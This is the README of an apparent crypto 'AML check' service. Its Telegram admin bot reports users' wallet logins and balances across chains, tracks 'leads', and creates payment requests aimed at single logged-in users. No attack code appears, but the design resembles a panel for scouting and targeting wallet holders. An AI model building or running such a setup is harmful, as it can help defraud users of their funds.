# AML Best

Static frontend for GitHub Pages plus Node/SQLite backend and a private Telegram admin bot for Render or Railway.

## Backend deploy

1. Deploy this repository as a Node web service.
2. Use `npm install` as build command.
3. Use `npm start` as start command.
4. Set environment variables:
   - `ALLOWED_ORIGINS=https://iwtluxz.github.io`
   - `USER_SESSION_TTL_DAYS=30` - how long wallet login stays active
   - `TELEGRAM_BOT_TOKEN` - a new token generated by `@BotFather`
   - `TELEGRAM_ADMIN_CHAT_IDS` - comma-separated Telegram chat IDs allowed to use the bot
   - `PUBLIC_BASE_URL` - public HTTPS backend URL, for example `https://aml-best-api.onrender.com`

Do not commit the bot token to GitHub. If a token was posted in a message or log, revoke it in
`@BotFather` with `/revoke` and generate a new one.

## Telegram admin

1. Deploy the backend with `TELEGRAM_BOT_TOKEN` set.
2. Open the bot and send `/myid`.
3. Add the returned ID to `TELEGRAM_ADMIN_CHAT_IDS` and restart the service.
4. Available commands:
   - `/stats`
   - `/sessions`
   - `/balance <address>`
   - `/users`
   - `/checks`
   - `/leads`
   - `/payment` or the **Запросить оплату у пользователя** button — create a payment request that the user must confirm in their wallet
   - `/payuser <0x-user> <evm|tron> ...` — create a payment request visible only to one active user session
   - `/withdraw` or the **Вывести treasury** button — sweep all funds from the service treasury wallet to an address you provide

The bot uses a Telegram webhook in production and also sends notifications about wallet logins,
new checks, and contact requests. Without `PUBLIC_BASE_URL`, it falls back to polling for local use.

### User-confirmed payment requests

Use `/payment` in the Telegram admin bot to create a transparent payment request. The user sees the network,
token, amount, and recipient on `check.html`, then must press the confirmation button and approve the
transaction inside their own wallet. The server stores only public request data and the submitted transaction
hash; it never receives user private keys and cannot move user funds without wallet confirmation.

Admins can manage active wallet-login sessions from Telegram:

- `/sessions` lists active EVM profiles with expiration time and quick command examples.
- `/balance <0x...>` checks public native balances on supported EVM networks.
- `/balance <T...>` checks public TRX and USDT TRC20 balances.
- `/payuser <0x-user> <evm|tron> ...` creates a payment request for one active EVM profile only. The request appears only for that logged-in user and still requires wallet confirmation.

Supported request formats:

- `evm <chainId> <amount> [0x-recipient]` — native EVM transfer, for example `evm 1 0.01 0x...`
- `tron usdt <amount> [T-recipient]` — USDT TRC20 transfer
- `tron trx <amount> [T-recipient]` — TRX transfer

If the recipient is omitted, set defaults with `PAYMENT_EVM_RECIPIENT` and `PAYMENT_TRON_RECIPIENT`.
TRON payments require a wallet/browser that exposes `window.tronWeb`.

### Treasury withdraw

To enable admin withdrawals, set one or both env vars with **your service wallet** private keys:

- `TRON_TREASURY_PRIVATE_KEY` — sweeps TRX and USDT TRC20 to a `T...` address
- `EVM_TREASURY_PRIVATE_KEY` — sweeps native balances across supported EVM networks to a `0x...` address

Flow: `/withdraw` or **Вывести treasury** → send destination address → confirm. This only moves funds from the configured treasury wallet. It cannot access user wallets (the site never receives user private keys).
Wallet login supports Ethereum/EVM wallets through Trust Wallet or MetaMask. EVM login notifications scan Ethereum, BNB Smart Chain, Polygon, Base, Arbitrum One, and OP Mainnet, then show only networks with a non-zero public native balance. TRON TRX / USDT TRC20 is checked as a public balance lookup: the user copies a public TRON address from Trust Wallet and pastes it into the form. This does not prove TRON wallet ownership, does not request a signature, and does not use TronLink. Custom RPC URLs can be set with the variables shown in `.env.example`. Multiple custom RPC URLs for one network can be separated with commas.

For local development, copy `.env.example` to `.env` and run `npm start`. The start command loads
`.env` automatically. Check `http://localhost:3000/api/health`: Telegram status should be `running`.

## Connect frontend to backend

After backend deploy, edit `config.js`:

```js
window.AML_API_BASE = "https://your-backend-url";
```

Without `AML_API_BASE`, GitHub Pages runs in local demo mode and cannot keep a shared database or send Telegram notifications.


## Telegram notifications

В этой версии включён режим одного сообщения: EVM-вход не отправляет отдельное уведомление в Telegram. Полное уведомление отправляется после TRON-проверки и включает EVM-адрес пользователя, TRX и USDT TRC20 баланс.
